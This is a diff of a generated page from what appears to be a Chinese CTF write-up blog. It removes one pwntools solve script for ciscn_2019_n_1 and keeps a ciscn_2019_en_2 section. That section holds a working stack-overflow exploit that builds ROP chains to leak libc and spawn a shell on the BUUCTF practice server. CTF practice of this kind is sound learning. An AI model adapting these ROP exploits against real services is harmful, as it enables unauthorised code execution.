@@ -119,18 +119,18 @@
 
 
 
-  <meta name="description" content="ciscn_2019_n_1 12345678from pwn import *#r = process(&quot;./ciscn_2019_n_1&quot;)r = remote(&quot;node3.buuoj.cn&quot;, &quot;28979&quot;)r.sendafter(&quot;the number.\n&quot;, p32(0x41348000) * 12 + &quot;\n&quot;)print r.recvline()[:-1] ciscn_20">
+  <meta name="description" content="pwn ciscn_2019_en_2 \x00截断即可. 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = &quot;debug&quot;# r = process(&quot;./ciscn_2019_en_2&quot;)r = remote(&quot;node3.buuoj.cn&quot;, &quot;">
 <meta name="keywords" content="Jeopardy">
 <meta property="og:type" content="article">
 <meta property="og:title" content="writeup-buuctf">
 <meta property="og:url" content="https://hitworld.github.io/posts/7d8dc2a1/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="ciscn_2019_n_1 12345678from pwn import *#r = process(&quot;./ciscn_2019_n_1&quot;)r = remote(&quot;node3.buuoj.cn&quot;, &quot;28979&quot;)r.sendafter(&quot;the number.\n&quot;, p32(0x41348000) * 12 + &quot;\n&quot;)print r.recvline()[:-1] ciscn_20">
+<meta property="og:description" content="pwn ciscn_2019_en_2 \x00截断即可. 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = &quot;debug&quot;# r = process(&quot;./ciscn_2019_en_2&quot;)r = remote(&quot;node3.buuoj.cn&quot;, &quot;">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-08-25T11:40:29.663Z">
+<meta property="og:updated_time" content="2020-08-26T03:21:06.432Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-buuctf">
-<meta name="twitter:description" content="ciscn_2019_n_1 12345678from pwn import *#r = process(&quot;./ciscn_2019_n_1&quot;)r = remote(&quot;node3.buuoj.cn&quot;, &quot;28979&quot;)r.sendafter(&quot;the number.\n&quot;, p32(0x41348000) * 12 + &quot;\n&quot;)print r.recvline()[:-1] ciscn_20">
+<meta name="twitter:description" content="pwn ciscn_2019_en_2 \x00截断即可. 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = &quot;debug&quot;# r = process(&quot;./ciscn_2019_en_2&quot;)r = remote(&quot;node3.buuoj.cn&quot;, &quot;">
 
 
 
@@ -496,7 +496,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">1k</span>
+                <span title="本文字数">834</span>
               
 
               
@@ -530,9 +530,8 @@
       
 
       
-        <h2 id="ciscn_2019_n_1">ciscn_2019_n_1</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("./ciscn_2019_n_1")</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="string">"28979"</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">"the number.\n"</span>, p32(<span class="number">0x41348000</span>) * <span class="number">12</span> + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvline()[:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
-<h2 id="ciscn_2019_en_2">ciscn_2019_en_2</h2>
+        <h2 id="pwn">pwn</h2>
+<h3 id="ciscn_2019_en_2">ciscn_2019_en_2</h3>
 <p><code>\x00</code>截断即可.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process("./ciscn_2019_en_2")</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="string">"26976"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Input your choice!\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"be encrypted\n"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span> * <span class="number">0x58</span></span><br><span class="line">payload += p64(<span class="number">0x400c83</span>) + p64(<span class="number">0x602020</span>) + p64(<span class="number">0x4006E0</span>)</span><br><span class="line">payload += p64(<span class="number">0x400790</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">libc = u64(r.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x809c0</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Input your choice!\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"be encrypted\n"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span> * <span class="number">0x58</span></span><br><span class="line">payload += p64(<span class="number">0x400c83</span>) + p64(libc + <span class="number">0x1b3e9a</span>) + p64(libc + <span class="number">0x4f440</span>)</span><br><span class="line">payload += p64(<span class="number">0x400c83</span>) + p64(libc + <span class="number">0x1b3e9a</span>) + p64(libc + <span class="number">0x4f440</span>)</span><br><span class="line"><span class="comment">#加了一行是因为上面那次调用貌似被干掉了</span></span><br><span class="line">payload += p64(<span class="number">0x400790</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc: "</span> + hex(libc)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -657,7 +656,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">172</span>
+                    <span class="site-state-item-count">171</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -849,7 +848,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn_2019_n_1"><span class="nav-number">1.</span> <span class="nav-text">ciscn_2019_n_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn_2019_en_2"><span class="nav-number">2.</span> <span class="nav-text">ciscn_2019_en_2</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ciscn_2019_en_2"><span class="nav-number">1.1.</span> <span class="nav-text">ciscn_2019_en_2</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -881,7 +880,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">727k</span>
+    <span title="站点总字数">705k</span>
   
 
   
@@ -890,7 +889,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:01</span>
+    <span title="站点阅读时长">10:41</span>
   
 </div>
 
